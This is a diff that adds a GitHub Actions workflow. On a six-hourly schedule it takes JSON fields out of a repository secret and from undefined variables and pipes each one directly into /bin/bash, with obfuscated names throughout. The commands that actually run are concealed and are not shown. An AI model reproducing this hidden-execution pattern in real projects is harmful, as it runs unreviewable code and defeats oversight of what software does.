@@ -1,0 +1,21 @@
+name: qianmianmided
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianmianmided
+        env:
+          y73: ${{ secrets.y73 }}
+        run: |
+          echo $y73 | jq -r .v19641 | /bin/bash
+          echo $w4987 | jq -r .zmxm186 | /bin/bash
+          echo $azdvg216 | jq -r .qdwww16928 | /bin/bash
+          echo $yuy2 | jq -r .ujcza847 | /bin/bash
+          echo $ylny99 | jq -r .o19050 | /bin/bash
+          echo $kvo955 | jq -r .jqa93 | /bin/bash
+
